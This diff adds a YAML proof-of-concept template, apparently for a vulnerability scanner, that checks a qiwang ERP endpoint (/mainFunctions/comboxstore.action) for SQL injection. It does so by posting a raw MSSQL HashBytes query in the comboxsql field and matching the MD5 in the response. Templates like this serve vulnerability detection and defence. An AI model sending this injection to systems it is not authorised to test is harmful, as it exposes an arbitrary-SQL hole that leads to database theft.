@@ -1,0 +1,23 @@
+name: yaml-poc-wantit-qiwang_erp-sql_injection-CT-479107
+binding: 0a7ced59-71cf-4d70-89a8-5d664fecd510
+detail:
+    author: system_user
+    vulnerability:
+        id: c73c1be3-a544-4e1c-bd95-235c36f2a7f6
+        level: high
+transport: http
+set:
+    s1: randomInt(3, 7)
+    s2: randomLowercase(s1)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /mainFunctions/comboxstore.action
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: comboxsql=select HashBytes('MD5', '{{s2}}')
+            follow_redirects: false
+        expression: response.status == 200 && response.body.ibcontains(bytes(md5(s2)))
+expression: r0()
